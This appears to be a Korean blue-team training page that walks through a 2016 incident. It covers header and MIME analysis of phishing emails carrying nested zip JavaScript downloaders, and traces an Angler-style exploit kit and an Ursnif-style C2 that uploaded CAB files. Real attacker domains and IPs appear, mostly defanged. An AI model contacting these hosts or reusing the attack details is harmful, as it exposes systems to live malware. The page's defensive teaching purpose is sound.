---
title: 피싱 메일이라는 함정, 실제 원인은 익스플로잇 킷 — Angler 유형 EK, Ursnif 유형 C2, CAB 유출 (Splunk + Arkime + Snort)
tags:
  - blue-team
  - pcap
  - email-analysis
  - phishing
  - splunk
  - zeek
  - arkime
  - snort
  - exploit-kit
  - c2
  - ticket
---

# 피싱 메일이라는 함정, 실제 원인은 익스플로잇 킷 — Angler 유형 EK, Ursnif 유형 C2, CAB 유출 { #phishing-red-herring-ek }

!!! abstract "사례 요약"
    업무 시간이 끝난 SOC에 혼자 남은 분석관이 세 가지 자료를 받습니다. 스팸 필터를 통과한 **악성 메일 7통**, **직원 목록**, 그리고 알림이 뜬 PC의 **12분짜리 PCAP**입니다. 먼저 메일을 분석합니다(헤더, MIME, base64, zip 내부). 메일이 원인처럼 보이지만, 트래픽은 다른 이야기를 합니다. 그 PC는 **재무이사(Finance Director)의 PC인 Dekker-PC**였고, **해킹된 웹사이트에 들어갔다가** 감염됐습니다. Flash로 된 게이트가 브라우저를 **익스플로잇 킷**(**Angler EK**와 같은 패턴)으로 보냈고, 킷은 오래된 **Flash Player 15.0.0.189**의 취약점을 공격해 암호화된 페이로드를 내려보냈습니다. 8초 뒤 PC는 **C2 체크인**을 시작했고(**Ursnif / Gozi-ISFB**와 같은 패턴), 암호화된 모듈을 더 받고, **CAB으로 압축한 파일 4개를 C2에 올렸습니다.** 메일은 **이 캡처에 대해서는 함정(레드 헤링)**이었고, 다른 PC들에 대한 별도 단서가 됩니다. 마지막에 **Snort 룰 11개를 만들어 PCAP으로 테스트**하고 침해사고 티켓을 완성합니다.

| | |
|---|---|
| **증거** | `.eml` 파일 7개(위험한 첨부 포함), 직원 목록(CSV), PCAP 1개: 2016-02-05 21:24:05 – 21:36:39 UTC (12분 34초), Zeek 연결 321개 |
| **환경** | 폐쇄망(VirusTotal, OSINT 불가). Zeek 로그가 들어간 Splunk, Arkime v5.6.4 웹 화면, 분석 PC의 Snort 2.9 |
| **결과물** | 이메일 IOC 분석, 네트워크 분석, 트래픽을 다시 찾는 Snort 룰, MC나 다른 헌트 팀에 넘길 침해사고 티켓, 호스트 오퍼레이터용 단서 |
| **관련 페이지** | [익스플로잇 킷 알아보기](../../training/blue-team-essentials/http-analysis/exploit-kits-practice.md) · [Base64](../../training/blue-team-essentials/http-analysis/base64.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [Zeek 로그](../../network/zeek/index.md) · [SPL 치트시트](../splunk/spl-cheatsheet.md) · [비콘과 C2](../../network/beaconing-c2.md) · [Snort 룰 (DC/SMB)](../../training/pcap-ir-labs/dc-smb-and-snort-rules.md) |

!!! tip "이 페이지 읽는 법"
    완전한 초보자도 첫 클릭부터 티켓 완성까지 따라 할 수 있게 썼습니다. 단계마다 같은 순서로 설명합니다.

    1. **목적** — 이 단계에서 무엇을 알아내려는지
    2. **쿼리 / 명령** — 코드 블록의 **복사 버튼**으로 복사
    3. **해설** — 한 줄, 한 옵션씩 무슨 뜻인지
    4. **실제 결과** — 이 사례에서 화면에 나온 것
    5. **결과 읽기** — 그 결과가 무슨 뜻이고 왜 중요한지
    6. **티켓 기록** — 이 단계의 작업 로그 한 줄

    **질문** 상자는 분석하면서 실제로 나온 질문입니다. **정정** 상자는 처음 판단이 틀렸고 뒤의 증거로 바로잡은 곳입니다. 일부러 남겨 두었습니다. 자기 실수를 찾아 고치는 것도 분석의 일부이기 때문입니다.

!!! warning "이 페이지의 지표는 실제 값입니다"
    도메인, IP, 해시는 2016년의 실제 악성 트래픽과 실제 스팸에서 나온 값입니다. 본문과 표에서는 무력화(`hxxp`, `[.]`)해서 적었고, 코드 블록(쿼리, 룰, 원본 출력) 안에서는 입력한 그대로 두었습니다. **절대 접속하지 마세요. 첨부파일은 격리된 분석 VM 밖에서 절대 열지 마세요.**

## 한눈에 보는 답 { #answers }

| 항목 | 답 | 상태 |
|---|---|---|
| PCAP 속 PC | **10.41.245.114 Dekker-PC**, MAC `00:17:31:7d:52:ba`(ASUSTek 랜카드), Windows 7 + IE11 — 사용자 **Justini Dekker, 재무이사** | 확인됨 (DHCP + 직원 목록) |
| 감염 원인 | **웹 드라이브 바이**: 해킹된 사이트 `www.source-werbeartikel[.]com` → 게이트 `lsbery[.]tk`(85.93.0.32) → 익스플로잇 킷 `bsbkxs.zdxwx3m[.]pw`(86.106.93.167) | 확인됨 |
| 첫 악성 이벤트 | **21:28:24 UTC** — 게이트로 `GET /shop.php?sid=<16진수 86자>`, 응답은 Flash 파일 | 확인됨 |
| 익스플로잇과 페이로드 | **Flash 15.0.0.189**를 노린 Flash 익스플로잇 `/charge.zhtml`(38,557바이트), 21:28:32 암호화된 페이로드 `/today.jst`(360,468바이트) | 확인됨 |
| C2 | `tplandthepropforcontent[.]com`(라운드 로빈 **185.86.77.12**, **192.210.137.123**), `/images/<base64>/*.gif\|jpeg\|bmp`, **21:28:41**부터 | 확인됨 |
| 유출 | CAB 파일(`MSCF`)을 `XXXX.bin` 이름으로 **POST 업로드 4번** (21:28:52, 21:30:54, 21:33:16, 21:35:15) | 확인됨 |
| 피싱 메일 | 메일 7통, 캠페인 3개, 직원 5명에게 zip 안의 `.js` 다운로더 — **이 캡처에는 흔적 없음** | 확인됨 (이 캡처와 무관) |
| EK 계열 | Angler 유형 (Flash 게이트, `/index.php?PHPSESSID=…&action=…` 랜딩, 무작위 영어 단어 파라미터, 가짜 확장자) | 추정 |
| 악성코드 계열 | Ursnif / Gozi-ISFB 유형 (`/images/` base64 경로 C2, `upload_file` CAB 업로드) | 추정 |
| IDS 탐지 | 기존 Snort 알림 데이터에 이 PC 관련 **알림 없음** — 새 룰 11개를 만들었고 모두 예상대로 울림, 캡처 안 오탐 0개 | 확인됨 |

---

## A부 — 시나리오와 받은 자료 { #scenario }

### 받은 것 { #given }

연습 문제 설명을 정리하면 이렇습니다.

- 24시간 운영되는 SOC에 업무 시간 이후 혼자 남았고, 수상한 활동 알림이 떴습니다.
- 알림이 뜬 IP를 찾아 관련 트래픽을 뽑았습니다(**PCAP**).
- 마침 스팸 필터를 통과한 **악성 메일**을 보고 있던 참이었습니다(`..._emails_DANGER` 폴더 안의 **`.eml` 7개**).
- 알림 시간대에 네트워크에 있던 **사람 목록**도 받았습니다(**직원 CSV**: 이름, 로그인 이름, 직책, 업무 메일, 전화번호).
- 다른 헌트 팀(또는 MC)이 이어받을 수 있는 **티켓**을 쓰고, **호스트 오퍼레이터**를 위한 단서를 남기고, **트래픽을 다시 찾을 Snort 룰을 만드세요.**

### 티켓 양식 { #ticket-template }

팀 양식([최종 티켓](#ticket) 참고)은 이런 칸으로 되어 있습니다.

| 칸 | 내용 |
|---|---|
| `#SEARCH QUERIES#` | 정확한 Arkime(`MOLOCH:`) 쿼리와 Splunk 쿼리 — 실제 네트워크에서 관심 트래픽만 나올 만큼 구체적으로 |
| `#EVIDENCE LOCATIONS#` | `Team<#>: /home/<user>/<증거 폴더>/<파일>` — 관심 트래픽 캡처와 의심 파일 |
| `#OPERATION LOG#` | 작업 하나에 한 줄: `[<시각>, <작업자>] <무엇을 찾았는지> - <Found / Not Found / Further Analysis Required>` |
| `TOOL OUTPUT / NOTES` | 각 발견의 도구 출력. 작업 로그와 **같은** `[<시각>, <작업자>]` 표시를 붙여서 Ctrl+F로 둘을 함께 찾을 수 있게. 시각, 출발지/도착지, 모든 관심 필드(URI, User-Agent, 메서드, 상태 코드, referrer 등), 그리고 그 결과의 의미를 적음 |

!!! note "Moloch = Arkime"
    양식의 `MOLOCH:`는 Arkime 쿼리를 적는 곳입니다. Moloch는 Arkime의 옛 이름입니다.

### 계획 { #plan }

1. 이미 손에 있는 메일부터 분석해서 IOC를 뽑습니다.
2. Splunk(Zeek 로그)로 캡처를 이해합니다: 누가, 언제, 무엇을.
3. 메일이 이 트래픽의 원인인지 시험하고, 아니면 증거를 따라갑니다.
4. Arkime에서 패킷 수준으로 모두 확인하고, 증거를 저장하고, 해시를 기록합니다.
5. Snort 룰을 만들고 **PCAP으로 테스트**합니다.
6. 티켓을 씁니다.

---

## B부 — 이메일 분석 { #emails }

### B0단계 — 안전 먼저 { #email-safety }

!!! danger "폴더 이름이 DANGER인 데는 이유가 있습니다"
    - **격리된 리눅스 분석 VM 안에서만** 작업하세요. 윈도우에서는 `.js` 파일을 더블클릭하는 순간 `wscript.exe`가 실행합니다.
    - `.eml`을 **텍스트 편집기**로 여는 건 안전합니다. 그냥 글자입니다.
    - zip 목록 보기(`unzip -l`), 해시 구하기(`sha256sum`), base64 한 줄 디코드는 안전합니다. 아무것도 실행되지 않습니다.
    - 샘플을 온라인 서비스에 올리지 마세요. 조회는 **해시로만**, 그것도 정책이 허락할 때만 합니다(이번은 폐쇄망이라 조회 자체가 불가).
    - 꺼낸 파일은 이름 뒤에 `.bin`이나 `.infected`를 붙여 두세요.

### B1단계 — `Received:` 헤더는 아래에서 위로 읽기 { #received }

메일을 처리하는 서버마다 **맨 위에 `Received:` 줄을 하나씩 추가**합니다. 그래서:

- **맨 아래** `Received:` = 메일이 처음 출발한 곳
- **맨 위** `Received:` = 우리 서버(`mx1`)에 도착한 순간

**아래에서 위로** 읽어야 시간 순서가 맞습니다. 한 줄 안의 각 부분은 이런 뜻입니다.

| 부분 | 뜻 |
|---|---|
| `from 이름 (… [IP])` | 누가 연결했는지. **대괄호 안의 IP는 *우리* 서버가 직접 본 값이라 보낸 쪽이 위조할 수 없습니다.** 앞의 이름은 상대가 주장한 이름일 뿐입니다 |
| `by 이름` | 이 줄을 쓴 서버 |
| `with ESMTP` / `with ESMTPS` | 암호화 없는 / **암호화(TLS)된** SMTP (`S`) |
| `with local` | 그 서버 **안의 프로그램이 직접 만든 메일**(예: PHP 스크립트). 다른 서버에서 받은 게 아님 |
| `for <주소>` | 받는 사람 |
| 날짜 `-0500`, `+0300` | 그 서버의 현지 시각과 UTC와의 차이. UTC로 바꾸기: `09:25 -0800` = 17:25 UTC |

!!! tip "어느 IP가 IOC인가요?"
    **맨 위** `Received:` 줄의 대괄호 IP(우리 MX에 연결한 IP)가 가장 믿을 만한 IOC입니다. 단, 그 서버가 **정상 ISP 메일 서버**(Mediacom, Telstra 등)라면 차단하면 안 됩니다. 그때는 더 아래 줄에서 진짜 출발지를 찾으세요.

### B2단계 — 함께 봐야 할 다른 헤더 { #headers }

| 헤더 | 볼 것 |
|---|---|
| `From:` | 표시 이름과 실제 주소. 완전히 위조 가능 |
| `Sender:` / `X-Authenticated-Sender:` / `X-Authentication-Info:` | 실제로 보낸 계정. `From:`과 다르면 누가 대신 보냈거나 계정을 도용한 것 |
| `X-PHP-Originating-Script:` / `X-PHP-Script:` | PHP/cPanel 호스팅이 붙임: **PHP 스크립트가 보낸 메일**. 해킹된 웹사이트에 올린 메일러에서 흔함. `X-PHP-Script: 사이트/경로.php for <IP>`는 **그 스크립트를 호출한 IP**까지 알려 줌 |
| `X-Mailer:` | 보낸 메일 프로그램이라고 주장하는 이름. PHP 헤더와 함께 "Windows Live Mail"이 있으면 위조 |
| `Date:` | `Received:` 시각과 비교. 차이가 크거나 시간대가 말이 안 되면 위조 또는 큐 대기 |
| `Message-ID:` | `<고유값@도메인>` 형식이어야 함. 도메인이 비어 있으면(`<…@>`) 형식 오류 |
| `Content-Type: multipart/mixed; boundary=…` | 메일이 여러 부분으로 나뉘고, boundary 글자로 구분됨 |
| `Content-Transfer-Encoding:` | 그 부분의 인코딩 방식([B4](#encodings) 참고) |
| `Content-Disposition: attachment; filename=…` | 첨부파일이라는 뜻과 그 이름 |

### B3단계 — zip 첨부 안의 파일 이름 알아내기 { #zip-inside }

**목적:** 아무것도 실행하지 않고 첨부파일 *안에* 무엇이 있는지 알아내기.

첨부 헤더에는 **zip 이름**만 나옵니다.

```text
Content-Type: application/x-zip-compressed;
        name="invoice304-18.zip"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
        filename="invoice304-18.zip"
```

- `Content-Type: application/x-zip-compressed` — 이 부분이 zip이라고 주장합니다.
- `name=` / `filename=` — 받는 사람에게 보이는 이름입니다.
- `Content-Transfer-Encoding: base64` — 바이너리 zip을 메일로 보낼 수 있게 글자로 바꿨다는 뜻입니다.
- `Content-Disposition: attachment` — 본문이 아니라 별도 첨부파일입니다.

zip **안의** 파일 이름은 base64 덩어리 속에 숨어 있습니다. 읽는 방법은 세 가지입니다.

#### 방법 1 — base64 첫 줄만 디코드하기 { #b64-first-line }

```bash
echo 'UEsDBBQAAAAIAJFhRUhPkndCTgsAAGUdAAAQAAAAaW52b2ljZTMwNC0xOC5qc41ZW4+jyBV+718x' | base64 -d | xxd | head -4
```

- `echo '…'` — base64 첫 줄을 출력합니다.
- `| base64 -d` — base64를 원래 바이트로 되돌립니다(`-d` = decode).
- `| xxd` — 바이트를 16진수와 글자로 나란히 보여 줍니다(`xxd`가 없으면 `od -A x -t x1z`).
- `| head -4` — 앞 4줄만 봅니다.

실제 결과:

```text
00000000: 504b 0304 1400 0000 0800 9161 4548 4f92  PK.........aEHO.
00000010: 7742 4e0b 0000 651d 0000 1000 0000 696e  wBN...e.......in
00000020: 766f 6963 6533 3034 2d31 382e 6a73 8d59  voice304-18.js.Y
```

오른쪽 글자 칸에 **`invoice304-18.js`** — JavaScript 파일이 보입니다.

**`UEsDB`가 zip인 이유:** zip은 항상 `PK`(Phil Katz) 바이트로 시작하고, `PK\x03\x04`를 base64로 바꾸면 항상 `UEsDB`가 됩니다. 몇 개를 외워 두세요.

| base64 시작 | 실제 파일 종류 |
|---|---|
| `UEsDB` | ZIP (.docx, .xlsx, .jar도 사실 zip) |
| `TVqQ` | 윈도우 실행파일 `MZ` (.exe/.dll) |
| `JVBERi` | PDF (`%PDF`) |
| `0M8R4K` | 옛날 Office (.doc/.xls, OLE) |
| `iVBORw0K` | PNG |
| `/9j/` | JPEG |

**zip 로컬 파일 헤더를 바이트 단위로:**

| 바이트(16진수) | 뜻 | 값 |
|---|---|---|
| `50 4b 03 04` | zip 시작 표시 | `PK..` |
| `14 00` | 풀 때 필요한 버전 | 2.0 |
| `00 00` | 플래그 | 암호 없음 |
| `08 00` | 압축 방식 | 8 = Deflate |
| `91 61` / `45 48` | DOS 시각 / 날짜 | 2016-02-05 12:12:34 (만든 PC의 현지 시각) |
| `4f 92 77 42` | CRC-32 | — |
| `4e 0b 00 00` | **압축된 크기** | 0x0B4E = 2,894바이트 |
| `65 1d 00 00` | **원래 크기** | 0x1D65 = **7,525바이트(약 7.5KB)** |
| `10 00` | 파일 이름 길이 | 0x10 = 16글자 |
| `00 00` | 추가 정보 길이 | 0 |
| `69 6e 76 …` | **파일 이름** | `invoice304-18.js` |

!!! note "리틀 엔디언"
    zip은 숫자를 **거꾸로** 적습니다. `65 1d`는 `1d65` = 7,525로 읽습니다. `10 00`은 `0010` = 16이라서 그 뒤 16바이트가 파일 이름입니다.

base64 덩어리의 **마지막 2~3줄**에는 zip의 끝 목록(중앙 디렉터리)이 있습니다. 같은 방법으로 디코드하면 파일 이름이 한 번 더 나오고, zip 안의 **파일 개수**도 알 수 있습니다.

#### 방법 2 — 첨부를 꺼내서 목록만 보기 { #extract-list }

```bash
mkdir ~/email1_attach && cd ~/email1_attach
python3 -c "
import email, sys
msg = email.message_from_file(open(sys.argv[1]))
for part in msg.walk():
    name = part.get_filename()
    if name:
        open(name, 'wb').write(part.get_payload(decode=True))
        print('saved:', name)
" ~/PCAPS/.../Phase2_PCAP_1_email_092704UTC.eml
unzip -l invoice304-18.zip
sha256sum invoice304-18.zip
unzip -p invoice304-18.zip | sha256sum
```

- `email.message_from_file(...)` — `.eml`을 MIME 부분들로 나눕니다.
- `msg.walk()` — 본문, HTML, 첨부 같은 모든 부분을 하나씩 돕니다.
- `part.get_filename()` — 첨부파일만 이름이 있습니다.
- `get_payload(decode=True)` — base64를 풀어 원래 zip 바이트로 만들어 줍니다.
- `unzip -l` — 압축을 풀지 않고 **목록만** 봅니다(`-l` = list). 디스크에 아무것도 생기지 않습니다.
- `sha256sum` — 티켓에 적을 해시입니다(파일은 절대 올리지 말고 해시로만 조회).
- `unzip -p … | sha256sum` — `-p`는 안의 파일을 디스크에 쓰지 않고 다음 명령으로 넘깁니다. `.js` 자체의 해시를 구할 수 있습니다.

`unzip -l` 예상 결과:

```text
Archive:  invoice304-18.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     7525  2016-02-05 12:12   invoice304-18.js
---------                     -------
     7525                     1 file
```

방법 1과 이름과 크기가 같습니다. `zipinfo -v`로 더 자세히(압축 크기, CRC, 추가 정보) 볼 수 있습니다.

#### 방법 3 — 다른 도구 { #other-tools }

- **CyberChef**(오프라인): base64를 붙여 넣고 `From Base64` → `Unzip`. 이름과 내용이 보입니다(실행은 안 됨).
- **Arkime**는 암호화 안 된 SMTP라면 첨부 이름(`email.fn`)을 보여 주지만, zip 안까지는 열어 주지 않습니다.
- **Zeek `files.log`**는 zip 이름, 해시, MIME 타입까지만 보여 줍니다.

### B4단계 — 메일은 항상 base64인가요? { #encodings }

!!! question "질문: 이메일은 항상 base64로 보내나요?"
    아니요. SMTP는 줄 길이 1,000자 미만의 **7비트 ASCII 글자**만 보내도록 만들어졌습니다. **MIME**이 생기면서 각 부분이 `Content-Transfer-Encoding`에 인코딩 방식을 적게 됐습니다. 이번 메일 7통에 다섯 가지가 다 나옵니다.

    | 인코딩 | 뜻 | 주로 쓰는 곳 | 이번 사례 |
    |---|---|---|---|
    | `7bit` | 바꾸지 않은 순수 ASCII | 영어 본문 | 메일 3, 4 본문 |
    | `8bit` | 바꾸지 않음, ASCII 외 글자 가능 | 본문 (서버가 8BITMIME 지원 시) | 메일 2 본문 |
    | `quoted-printable` | 대부분 그대로, 특수 바이트만 `=XX` | 특수문자가 조금 섞인 영어 본문 | 메일 1, 5, 6, 7 본문 |
    | `base64` | 전부 A–Z a–z 0–9 + / 로 바꿈 | **첨부파일**, 이미지 | 첨부 7개 전부 |
    | `binary` | 바이트 그대로 | 거의 안 씀 | — |

**quoted-printable 읽는 법** (메일 1 본문):

```text
We=A0are sorry to=A0inform you,=A0but the item you have=A0purchased is=A0=
```

- `=A0` — 0xA0 바이트, windows-1251의 줄바꿈 없는 공백입니다.
- `=20` — 일반 공백입니다(줄 끝 공백이 사라지지 않게 적음).
- 줄 **끝의** `=` — 소프트 줄바꿈: 문장이 다음 줄로 이어집니다.
- `=3D` — `=` 글자 자체입니다(`bgColor=3D#ffffff` = `bgColor=#ffffff`).

**헤더도 인코딩될 수 있습니다** (encoded-word):

```text
Subject: =?UTF-8?B?7ZmY67aI?=
Subject: =?UTF-8?Q?Refund_=E2=80=93_Order?=
```

`?B?` = base64, `?Q?` = quoted-printable. 피싱 메일이 키워드 필터를 피하려고 제목을 이렇게 쓰기도 합니다. 헤더 글자를 찾는 IDS 룰은 이런 메일을 놓칩니다.

!!! question "질문: 그럼 base64가 있으면 실행파일 첨부가 있다는 뜻인가요?"
    아니요. base64는 "글자로 그냥 보낼 수 없는 내용"이라는 뜻일 뿐입니다. 정상 메일에도 아주 흔합니다(서명 로고, PDF, Office 파일, 한글이 든 본문 등). base64를 보면 세 가지를 확인하세요.

    1. **첨부인가, 본문 삽입인가?** `Content-Disposition: attachment` = 사용자가 여는 파일, `inline`이나 `Content-ID:` = 본문에 보이는 그림.
    2. **무엇이라고 주장하나?** `Content-Type`과 `filename=` — 보낸 사람이 적은 것이라 거짓일 수 있습니다.
    3. **실제로는 무엇인가?** 첫 줄을 디코드해서 매직 바이트를 읽습니다([B3](#b64-first-line)의 표). 진짜 윈도우 실행파일은 `TVqQ`(`MZ`)뿐이고, 이런 파일은 보통 필터가 막습니다.

    위험한 첨부는 "실행파일"보다 넓습니다. **스크립트**(.js .vbs .wsf .hta .ps1 .bat), **매크로 문서**(.docm, .xlsm, 매크로 .doc/.xls), **바로가기와 디스크 이미지**(.lnk, .iso, .img), **HTML**(가짜 로그인 페이지), **PDF**(링크, JavaScript). 이것들을 zip으로 — 또는 **zip 안의 zip으로** — 감싸는 게 흔한 필터 우회 방법입니다. 그래서 zip이 보이면 꼭 안의 파일 이름까지 확인합니다.

### B5단계 — 메일 1 (09:27:04 UTC, mtsutsumi에게) { #email-1 }

**받는 사람:** mtsutsumi — Maki Tsutsumi, 네트워크 보안 엔지니어.

**경로 (아래에서 위로):**

```text
Received: by host5.t1host.ru (Postfix, from userid 33)
        id C7640600993F; Fri,  5 Feb 2016 12:25:56 +0300 (MSK)
Received: from host5.t1host.ru (static.213-133-123-17.clients.your-server.de [213.133.123.17])
        by mx1.<customer-domain> with ESMTPS id u159R1H1038361
        (version=TLSv1.2 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=NO)
        for <mtsutsumi@<customer-domain>>; Fri, 5 Feb 2016 09:27:04 GMT
```

- `host5.t1host[.]ru`에서 Postfix가 **userid 33**(웹서버 사용자)으로 12:25:56 MSK = **09:25:56 UTC**에 만들었습니다.
- **213.133.123.17**(역방향 이름 `your-server.de`, 독일 호스팅)에서 **09:27:04 UTC**에 **TLS**(`ESMTPS`)로 들어왔습니다.

**헤더:**

| 헤더 | 값 | 읽기 |
|---|---|---|
| From | `"Lewis Mckay" <elit@faucibusidlibero[.]com>` | 이름과 도메인이 관계없음. "faucibus id libero"는 Lorem ipsum 문구 — 가짜 도메인 |
| Subject | `Refund for the Order #284822` | 환불 미끼 |
| X-PHP-Originating-Script | `33:configsese.php` | 해킹된 웹서버의 **PHP 스크립트**가 보냄 |
| X-Mailer | `Microsoft Windows Live Mail 16.4.3528.331` | PHP 헤더와 모순 — 위조 |
| Date | `Fri, 5 Feb 2016 09:25:35 -0800` | = 17:25 UTC, 도착보다 8시간 **뒤**. UTC 시계에 엉뚱한 `-0800`을 붙인 것 |
| Message-ID | `<1AE0A0968D5975568A8FC67F6BB04CFB@faucibusidlibero.com>` | 역시 가짜 도메인 |

**첨부:** `invoice304-18.zip`(`application/x-zip-compressed`) → **`invoice304-18.js`**, 압축 2,894바이트, 원래 7,525바이트, zip 시각 12:12:34.

**판단:** **JavaScript 다운로더** — 2016년 초의 전형적인 패턴(랜섬웨어를 받아 오는 Nemucod 유형). 실행되면 `wscript.exe`가 돌리고 `.exe`를 내려받습니다.

### B6단계 — 메일 2 (09:34:13 UTC, jdekker에게) — 다른 캠페인 { #email-2 }

**받는 사람:** jdekker — **Justini Dekker, 재무이사**.

**경로 (아래에서 위로):**

```text
Received: from love2dat by server.hoast.com with local (Exim 4.86)
        (envelope-from <love2dat@server.hoast.com>)
        id 1aQpdL-0004cE-9d; Wed, 03 Feb 2016 00:05:39 -0500
Received: from server.hoast.com (server.hoast.com [67.222.128.148])
        by mx1.<customer-domain> with ESMTPS id u159YBT4009585
        (version=TLSv1.2 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=NO)
        for <jdekker@<customer-domain>>; Fri, 5 Feb 2016 09:34:13 GMT
```

- `from love2dat` + `with local` — 다른 서버에서 받은 게 아니라 `server.hoast[.]com` **안의** 호스팅 계정 `love2dat`이 만들었습니다. Exim은 cPanel 호스팅의 기본 메일 서버입니다.
- **2월 3일 00:05:39 -0500 = 05:05:39 UTC**에 만들어졌고 **2월 5일 09:34:13 UTC**에 도착했습니다 — **약 52시간** 뒤입니다. 대량 스팸이 큐에 쌓였거나 재시도를 반복한 것입니다. 어느 쪽이든 캠페인이 **이틀 전에 시작됐다**는 뜻이라, 다른 기관이 이미 IOC를 공개했을 수 있습니다.
- `verify=NO` — mx1이 상대 인증서를 검사하지 않았다는 뜻입니다. 메일 서버끼리는 흔해서 이것만으로는 의심할 게 아닙니다.

**진짜 보낸 사람 — 헤더 다섯 개:**

```text
From: "Finance Department" <wgygbcgync@love2date.us>
Sender:  <love2dat@server.hoast.com>
X-Get-Message-Sender-Via: server.hoast.com: authenticated_id: love2dat/from_h
X-Authenticated-Sender: server.hoast.com: wgygbcgync@love2date.us
X-PHP-Script: love2date.us/headers/wrigs61.php for 185.60.133.27
```

- `From` — "재무팀"이지만 주소는 데이트 사이트 도메인의 무작위 문자열입니다.
- `Sender` — 실제로 보낸 계정입니다.
- `X-Get-Message-Sender-Via` / `X-Authenticated-Sender` — 스팸을 호스팅 계정까지 추적하려고 **cPanel**이 붙이는 헤더입니다. 호스팅 계정 `love2dat`이 보냈고 From 주소는 헤더에서 가져왔다(`from_h`)는 뜻입니다.
- **`X-PHP-Script: love2date.us/headers/wrigs61.php for 185.60.133.27`** — `love2date[.]us`의 PHP 파일 `/headers/wrigs61.php`가 보냈고, **185.60.133.27이 그 스크립트를 웹으로 호출**했습니다. 데이트 사이트에 `/headers/` 아래 무작위 이름의 스크립트가 있을 이유가 없으니 → 사이트가 해킹되고 메일러가 올라간 것입니다. 185.60.133.27이 공격자에 가장 가까운 IP입니다. 우리 네트워크와 직접 통신하지 않았으니 **위협 정보용 IOC**로 기록합니다.

```text
185.60.133.27 --(웹 요청)--> love2date.us/headers/wrigs61.php (server.hoast.com 안)
   -> Exim이 메일 생성 (2/3 05:05 UTC)
   -> 67.222.128.148 (server.hoast.com) --(TLS로 SMTP)--> mx1 (2/5 09:34 UTC)
   -> jdekker 메일함
```

**그 밖의 이상한 점:**

- `To:`가 **두 번** 나옵니다 — 엉성한 메일러.
- `Message-ID: <211504694.20160203000538@>` — **도메인이 비어 있는** 형식 오류. 숫자에 생성 시각 2016-02-03 00:05:38이 들어 있습니다.
- `Date: Wed, 3 Feb 2016 0:05:38 -0500` — 맨 아래 `Received:`와 맞으니 이 Date는 진짜입니다(메일 1과 다름). **다른 도구**라는 또 하나의 증거입니다.
- `X-Mailer`가 아예 없습니다.

**본문**(`text/html`, `8bit`): "NOTICE! You have received a remittance … Money Order can be cashed at any branch or bank in Your city . … Division of Payments WU000076846645". 재무이사를 노린 "돈이 들어왔다" 미끼, 문장 중간의 대문자 `Your`, 마침표 앞 공백, 이미지 `alt="western unioun"` 오타.

```html
<IMG ... alt="western unioun" ... src="https://www.cehost.ro/templates/cehostv3/html/images/westernunion_logo_big.gif">
```

!!! tip "외부 이미지는 누가 메일을 열었는지 알려 줍니다"
    로고를 메일에 넣지 않고 **다른 웹사이트에서 불러오게** 했습니다. 누군가 HTML을 여는 순간, 그 PC가 **`www.cehost[.]ro` DNS 질의**와 **HTTPS 연결**을 합니다(TLS SNI에 이름이 보임). 둘 다 Zeek `dns.log` / `ssl.log`에 남으니, 메일을 읽지 않고도 **누가 언제 열었는지** 찾을 수 있습니다. `cehost[.]ro`는 루마니아 호스팅 회사 사이트를 무단으로 가져다 쓴(핫링크) 것으로 보이므로 차단 IOC가 아니라 **"열었다" 표시**로 씁니다.

**첨부 — zip 안의 zip:**

```text
Content-Type: application/octet-stream;
 name="WU7328899085.zip"
Content-transfer-encoding: base64
Content-Disposition: attachment;
 filename="WU7328899085.zip"
```

메일 1과 달리 `application/octet-stream`("그냥 바이트")이라 종류를 숨깁니다. base64 첫 두 줄을 붙여서 디코드합니다.

```bash
echo 'UEsDBAoAAAAAAIEoQ0gqQtZfwgYAAMIGAAAIABwAZmlsZS56aXBVVAkAA0GKsVZ9irFWdXgLAAEEAAAAAAQAAAAAUEsDBBQACAAIAPWiQkgAAAAAAAAAAAAAAAAWAAAAaW52b2ljZV9zY2FuX0RneUVmbC5qc' | base64 -d | xxd
```

(끝이 글자 중간에서 잘려 `invalid input` 경고가 나올 수 있지만 앞부분은 정상으로 나옵니다.)

```text
00000000: 504b 0304 0a00 0000 0000 8128 4348 2a42  PK.........(CH*B
00000010: d65f c206 0000 c206 0000 0800 1c00 6669  ._............fi
00000020: 6c65 2e7a 6970 5554 0900 0341 8ab1 567d  le.zipUT...A..V}
00000030: 8ab1 5675 780b 0001 0400 0000 0004 0000  ..Vux...........
00000040: 0000 504b 0304 1400 0800 0800 f5a2 4248  ..PK..........BH
00000050: 0000 0000 0000 0000 0000 0000 1600 0000  ................
00000060: 696e 766f 6963 655f 7363 616e 5f44 6779  invoice_scan_Dgy
00000070: 4566 6c2e 6a                             Efl.j
```

**`PK`가 두 번 = zip이 두 개.**

바깥 zip `WU7328899085.zip`:

| 바이트 | 뜻 | 값 |
|---|---|---|
| `0a 00` | 버전 | 1.0 |
| `00 00` | 압축 방식 | **0 = 압축 안 함**(zip은 이미 압축돼 있음) |
| `81 28` / `43 48` | 시각 / 날짜 | 2016-02-03 05:04:02 |
| `c2 06 00 00` ×2 | 압축 크기 = 원래 크기 | 1,730바이트 |
| `08 00` / `1c 00` | 이름 길이 / 추가 정보 길이 | 8 / 28 |
| 이름 | | **`file.zip`** |
| `UT …` `ux …` | 추가 정보 | 유닉스 시각 + 유닉스 사용자 ID → 리눅스 `zip`으로 만듦. `UT` 시각 = **2016-02-03 05:04:01 UTC**, 메일 생성 1분 30초 전 |

안쪽 zip `file.zip` (0x42 = 66번째 바이트부터 = 30 + 8 + 28):

| 바이트 | 뜻 | 값 |
|---|---|---|
| `08 00` (플래그) | 비트 3 켜짐 | 크기를 데이터 **뒤에** 적음(스트림 생성) — 그래서 여기의 CRC와 크기가 0 |
| `08 00` | 압축 방식 | Deflate |
| `f5 a2` / `42 48` | 시각 / 날짜 | 2016-02-02 20:23:42 |
| `16 00` | 이름 길이 | 22 |
| 이름 | | **`invoice_scan_DgyEfl.js`** (받는 사람마다 무작위 꼬리) |

진짜 크기는 끝의 중앙 디렉터리에 있습니다(마지막 base64 줄 디코드): **압축 1,572바이트, 원래 4,500바이트** — 메일 1의 7,525바이트와 다른 스크립트입니다.

**왜 두 번 쌌을까?** 메일 보안 장비는 zip을 **한 겹만** 여는 경우가 많습니다. 한 겹 열면 `file.zip`만 보이니 안쪽 `.js`가 통과할 수 있습니다.

전체 파일로 확인하기:

```bash
unzip -l WU7328899085.zip
unzip -p WU7328899085.zip file.zip > file.zip
